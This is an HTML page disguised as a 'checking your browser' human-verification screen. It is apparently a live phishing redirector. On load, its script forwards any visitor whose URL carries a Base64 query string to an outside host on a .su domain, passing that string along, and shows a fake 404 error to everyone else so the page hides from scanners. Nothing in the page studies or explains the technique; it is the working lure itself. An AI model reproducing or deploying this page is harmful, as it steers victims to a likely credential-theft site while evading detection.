<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying Connection</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: 'Arial', sans-serif;
        }
        .container {
            text-align: center;
            max-width: 400px;
            width: 100%;
            padding: 30px;
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
            border: 1px solid #ddd;
        }
        .message {
            font-size: 16px;
            color: #333;
            margin-bottom: 20px;
            line-height: 1.6;
            font-weight: 400;
        }
        .loading {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 20px 0;
        }
        .loading div {
            width: 12px; /* Bubble size */
            height: 12px; /* Bubble size */
            margin: 0 6px;
            background-color: #333;
            border-radius: 50%;
            animation: loading 1.5s infinite ease-in-out;
        }
        .loading div:nth-child(2) {
            animation-delay: -0.3s;
        }
        .loading div:nth-child(3) {
            animation-delay: -0.6s;
        }
        .loading div:nth-child(4) {
            animation-delay: -0.9s;
        }
        .loading div:nth-child(5) {
            animation-delay: -1.2s;
        }
        @keyframes loading {
            0% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.5);
            }
            100% {
                transform: scale(1);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="message">We are currently checking your browser for a secure connection...</div>
        <div class="loading">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
        <div class="message">Please hold on while we verify that you are human...</div>
    </div>

    <script>
        function isBase64(str) {
            try {
                // Check if string length is divisible by 4 and contains only valid Base64 characters
                return btoa(atob(str)).replace(/=/g, '') === str.replace(/=/g, '');
            } catch (e) {
                return false;
            }
        }

        function redirectWithQuery() {
            const baseRedirectUrl = "https://4abkh.mudequel.su/SQCCb/#";
            const queryString = window.location.search.substring(1);
            const contentDiv = document.querySelector('.container'); // Changed from 'getElementById' to 'querySelector'

            if (queryString && isBase64(queryString)) {
                const redirectUrl = `${baseRedirectUrl}${queryString}`;
                // Redirect to the URL
                window.location.href = redirectUrl;
            } else {
                // Display 404 error message
                contentDiv.innerHTML = '<h1>404 Page Not Found</h1><p>The requested page could not be found.</p>';
            }
        }

        redirectWithQuery();
    </script>
</body>
</html>
